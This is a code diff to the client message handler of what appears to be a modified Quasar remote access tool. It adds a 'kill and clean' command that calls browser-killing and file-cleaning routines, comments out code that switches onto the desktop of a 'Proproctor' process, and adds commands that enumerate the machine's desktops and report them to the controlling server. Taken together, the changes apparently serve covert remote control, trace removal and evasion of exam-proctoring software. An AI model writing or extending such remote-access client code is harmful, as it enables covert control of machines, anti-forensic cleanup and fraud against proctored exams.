@@ -1,4 +1,5 @@
 ﻿using Quasar.Client.Utilities;
+using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using System;
@@ -270,154 +271,175 @@ namespace Quasar.Client.Messages
         {
             new Thread(() =>
             {
-                if (message.type == "kill_clean")
+                if (message.Type == CustomCommandType.KILL_AND_CLEAN)
                 {
                     KillBrowsers(client);
                     CleanFiles(client);
                 }
-                else if (message.type == "switch_vDesktop")
-                {
-                    //    try
-                    //    {
-                    //        string processName = "Proproctor"; // No .exe needed
-                    //        uint guiThreadId = GetGuiThreadId(processName);
-                    //        if (guiThreadId != 0)
-                    //        {
-                    //            IntPtr targetDesktop = GetThreadDesktop(guiThreadId);
+                //else if (message.Type == "switch_vDesktop")
+                //{
+                //    //    try
+                //    //    {
+                //    //        string processName = "Proproctor"; // No .exe needed
+                //    //        uint guiThreadId = GetGuiThreadId(processName);
+                //    //        if (guiThreadId != 0)
+                //    //        {
+                //    //            IntPtr targetDesktop = GetThreadDesktop(guiThreadId);
 
-                    //            if (targetDesktop == IntPtr.Zero)
-                    //            {
-                    //                client.Send(new NotifyMessageToServer { Message = "Failed to get target desktop." });
-                    //                return;
-                    //            }
+                //    //            if (targetDesktop == IntPtr.Zero)
+                //    //            {
+                //    //                client.Send(new NotifyMessageToServer { Message = "Failed to get target desktop." });
+                //    //                return;
+                //    //            }
 
-                    //            uint currentThreadId = GetCurrentThreadId();
-                    //            IntPtr currentDesktop = GetThreadDesktop(currentThreadId);
+                //    //            uint currentThreadId = GetCurrentThreadId();
+                //    //            IntPtr currentDesktop = GetThreadDesktop(currentThreadId);
 
-                    //            if (SetThreadDesktop(targetDesktop))
-                    //            {
-                    //                string desktopName = GetDesktopName(targetDesktop);
-                    //                client.Send(new NotifyMessageToServer { Message = "Successfully set current thread's desktop : " + desktopName });
+                //    //            if (SetThreadDesktop(targetDesktop))
+                //    //            {
+                //    //                string desktopName = GetDesktopName(targetDesktop);
+                //    //                client.Send(new NotifyMessageToServer { Message = "Successfully set current thread's desktop : " + desktopName });
 
-                    //                // Optionally close the old desktop handle if it's no longer needed
-                    //                if (currentDesktop != IntPtr.Zero && currentDesktop != targetDesktop)
-                    //                {
-                    //                    if (CloseDesktop(currentDesktop))
-                    //                        client.Send(new NotifyMessageToServer { Message = "Previous desktop handle closed." });
-                    //                    else
-                    //                        client.Send(new NotifyMessageToServer { Message = "Failed to close previous desktop handle." });
-                    //                }
-                    //            }
-                    //            else
-                    //            {
-                    //                client.Send(new NotifyMessageToServer { Message = "Failed to set thread desktop." });
-                    //            }
-                    //        }
-                    //        else
-                    //        {
-                    //            client.Send(new NotifyMessageToServer { Message = "GUI thread not found." });
-                    //        }
-                    //    }
-                    //    catch (Exception ex)
-                    //    {
-                    //        client.Send(new NotifyMessageToServer { Message = "Error: " + ex.Message });
-                    //    }
-                    //}
+                //    //                // Optionally close the old desktop handle if it's no longer needed
+                //    //                if (currentDesktop != IntPtr.Zero && currentDesktop != targetDesktop)
+                //    //                {
+                //    //                    if (CloseDesktop(currentDesktop))
+                //    //                        client.Send(new NotifyMessageToServer { Message = "Previous desktop handle closed." });
+                //    //                    else
+                //    //                        client.Send(new NotifyMessageToServer { Message = "Failed to close previous desktop handle." });
+                //    //                }
+                //    //            }
+                //    //            else
+                //    //            {
+                //    //                client.Send(new NotifyMessageToServer { Message = "Failed to set thread desktop." });
+                //    //            }
+                //    //        }
+                //    //        else
+                //    //        {
+                //    //            client.Send(new NotifyMessageToServer { Message = "GUI thread not found." });
+                //    //        }
+                //    //    }
+                //    //    catch (Exception ex)
+                //    //    {
+                //    //        client.Send(new NotifyMessageToServer { Message = "Error: " + ex.Message });
+                //    //    }
+                //    //}
 
-                    try
-                    {
-                        //uint a = 0;
+                //    try
+                //    {
+                //        uint a = 0;
 
-                        //List<string> desktopNames = new List<string>();
-                        //NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
-                        //{
-                        //    desktopNames.Add(desktop);
-                        //    return true;
-                        //}, IntPtr.Zero);
+                //        List<string> desktopNames = new List<string>();
+                //        NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
+                //        {
+                //            desktopNames.Add(desktop);
+                //            return true;
+                //        }, IntPtr.Zero);
 
-                        //uint currentThreadId = GetCurrentThreadId();
-                        //IntPtr currentDesktop = GetThreadDesktop(currentThreadId);
-                        //string currentDesktopName = GetDesktopName(currentDesktop);
+                //        uint currentThreadId = GetCurrentThreadId();
+                //        IntPtr currentDesktop = GetThreadDesktop(currentThreadId);
+                //        string currentDesktopName = GetDesktopName(currentDesktop);
 
-                        //string newDesktopName = "\\" + desktopNames[currentDesktopIndex];
-                        //if (currentDesktopName != newDesktopName)
-                        //{
-                        //    if (currentDesktop.ToInt64() != 0L)
-                        //    {
-                        //        NativeMethods.CloseDesktop(currentDesktop);
-                        //    }
-                        //    IntPtr newDesktop = NativeMethods.OpenDesktop(newDesktopName, 0, false, 268435456U);
-                        //    if (newDesktop != IntPtr.Zero)
-                        //    {
-                        //        if (!NativeMethods.SetThreadDesktop(newDesktop)) {
-                        //            client.Send(new NotifyMessageToServer { Message = $"Failed to set client thread's desktop as {newDesktopName} Desktop" });
-                        //        }
-                        //        else
-                        //        {
-                        //            client.Send(new NotifyMessageToServer { Message = $"Successfully changed client thread's desktop as {newDesktopName} Desktop" });
-                        //            uint curTId = GetCurrentThreadId();
-                        //            IntPtr curDesktop = GetThreadDesktop(curTId);
-                        //            string curDesktopName = GetDesktopName(curDesktop);
-                        //            client.Send(new NotifyMessageToServer { Message = $"Current Desktop Name is {curDesktopName}" });
-                        //        }
-                        //    }
-                        //    else
-                        //    {
-                        //        client.Send(new NotifyMessageToServer { Message = $"Failed to open {newDesktopName} Desktop"});
-                        //    }
-                        //}
+                //        //string newDesktopName = "\\" + desktopNames[currentDesktopIndex];
+                //        //if (currentDesktopName != newDesktopName)
+                //        //{
+                //        //    if (currentDesktop.ToInt64() != 0L)
+                //        //    {
+                //        //        NativeMethods.CloseDesktop(currentDesktop);
+                //        //    }
+                //        //    IntPtr newDesktop = NativeMethods.OpenDesktop(newDesktopName, 0, false, 268435456U);
+                //        //    if (newDesktop != IntPtr.Zero)
+                //        //    {
+                //        //        if (!NativeMethods.SetThreadDesktop(newDesktop))
+                //        //        {
+                //        //            client.Send(new NotifyMessageToServer { Message = $"Failed to set client thread's desktop as {newDesktopName} Desktop" });
+                //        //        }
+                //        //        else
+                //        //        {
+                //        //            client.Send(new NotifyMessageToServer { Message = $"Successfully changed client thread's desktop as {newDesktopName} Desktop" });
+                //        //            uint curTId = GetCurrentThreadId();
+                //        //            IntPtr curDesktop = GetThreadDesktop(curTId);
+                //        //            string curDesktopName = GetDesktopName(curDesktop);
+                //        //            client.Send(new NotifyMessageToServer { Message = $"Current Desktop Name is {curDesktopName}" });
+                //        //        }
+                //        //    }
+                //        //    else
+                //        //    {
+                //        //        client.Send(new NotifyMessageToServer { Message = $"Failed to open {newDesktopName} Desktop" });
+                //        //    }
+                //        //}
 
-                        //if (currentDesktopIndex < desktopNames.Count - 1)
-                        //{
-                        //    currentDesktopIndex++;
-                        //}
-                        //else
-                        //{
-                        //    currentDesktopIndex = 0;
-                        //}
+                //        //if (currentDesktopIndex < desktopNames.Count - 1)
+                //        //{
+                //        //    currentDesktopIndex++;
+                //        //}
+                //        //else
+                //        //{
+                //        //    currentDesktopIndex = 0;
+                //        //}
 
-                        //string temp = "Available Desktop Names:\n";
-                        //foreach (string desktopName in desktopNames)
-                        //{
-                        //    temp += desktopName + "\n";
-                        //}
+                //        string temp = "Available Desktop Names:\n";
+                //        foreach (string desktopName in desktopNames)
+                //        {
+                //            if(currentDesktopName == desktopName)
+                //            {
+                //                temp += "Current: " + desktopName + "\n";
+                //                continue;
+                //            }
+                //            temp += desktopName + "\n";
+                //        }
 
-                        //client.Send(new NotifyMessageToServer { Message = temp });
+                //        client.Send(new NotifyMessageToServer { Message = temp });
 
-                        IntPtr hWinsta = NativeMethods.GetProcessWindowStation();
-                        if (hWinsta == IntPtr.Zero)
-                        {
-                            client.Send(new NotifyMessageToServer { Message = "Failed to get window station handle. Error: " + Marshal.GetLastWin32Error() });
-                            return;
-                        }
+                //        IntPtr hWinsta = NativeMethods.GetProcessWindowStation();
+                //        if (hWinsta == IntPtr.Zero)
+                //        {
+                //            client.Send(new NotifyMessageToServer { Message = "Failed to get window station handle. Error: " + Marshal.GetLastWin32Error() });
+                //            return;
+                //        }
 
-                        // First call to get required length
-                        GetUserObjectInformation(hWinsta, UOI_NAME, null, 0, out int lengthNeeded);
-                        if (lengthNeeded == 0)
-                        {
-                            client.Send(new NotifyMessageToServer { Message = "Failed to get required buffer size. Error: " + Marshal.GetLastWin32Error() });
-                            return;
-                        }
+                //        // First call to get required length
+                //        GetUserObjectInformation(hWinsta, UOI_NAME, null, 0, out int lengthNeeded);
+                //        if (lengthNeeded == 0)
+                //        {
+                //            client.Send(new NotifyMessageToServer { Message = "Failed to get required buffer size. Error: " + Marshal.GetLastWin32Error() });
+                //            return;
+                //        }
 
-                        StringBuilder name = new StringBuilder(lengthNeeded);
-                        if (!GetUserObjectInformation(hWinsta, UOI_NAME, name, lengthNeeded, out _))
-                        {
-                            client.Send(new NotifyMessageToServer { Message = "GetUserObjectInformation failed. Error: " + Marshal.GetLastWin32Error() });
-                            return;
-                        }
+                //        StringBuilder name = new StringBuilder(lengthNeeded);
+                //        if (!GetUserObjectInformation(hWinsta, UOI_NAME, name, lengthNeeded, out _))
+                //        {
+                //            client.Send(new NotifyMessageToServer { Message = "GetUserObjectInformation failed. Error: " + Marshal.GetLastWin32Error() });
+                //            return;
+                //        }
 
-                        client.Send(new NotifyMessageToServer { Message = "Current Window Station Name: " + name.ToString() });
-                    }
-                    catch (Exception ex)
-                    {
-                        client.Send(new NotifyMessageToServer { Message = "Error: " + ex.Message });
-                    }
-                }
-                else if(message.type== "GET_ACTIVE_DESKTOP")
+                //        client.Send(new NotifyMessageToServer { Message = "Current Window Station Name: " + name.ToString() });
+                //    }
+                //    catch (Exception ex)
+                //    {
+                //        client.Send(new NotifyMessageToServer { Message = "Error: " + ex.Message });
+                //    }
+                //}
+                else if(message.Type == CustomCommandType.GET_ACTIVE_DESKTOP)
                 {
                     IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                     string strDesktopName = GetDesktopName(hInputDesktop);
-                    client.Send(new NotifyMessageToServer { Type = "cur_dsk", Message = strDesktopName });
+                    client.Send(new DesktopsInformationResponse { ActiveDesktop = strDesktopName, Desktops = "NULL" });
+                }
+                else if(message.Type == CustomCommandType.GET_DESKTOPS)
+                {
+                    IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
+                    string activeDesktopName = GetDesktopName(hInputDesktop);
+
+                    List<string> desktopNames = new List<string>();
+                    NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
+                    {
+                        desktopNames.Add(desktop);
+                        return true;
+                    }, IntPtr.Zero);
+
+                    string joinedStr = string.Join("|", desktopNames.ToArray());
+                    client.Send(new DesktopsInformationResponse { Desktops = joinedStr, ActiveDesktop = activeDesktopName });
                 }
 
 
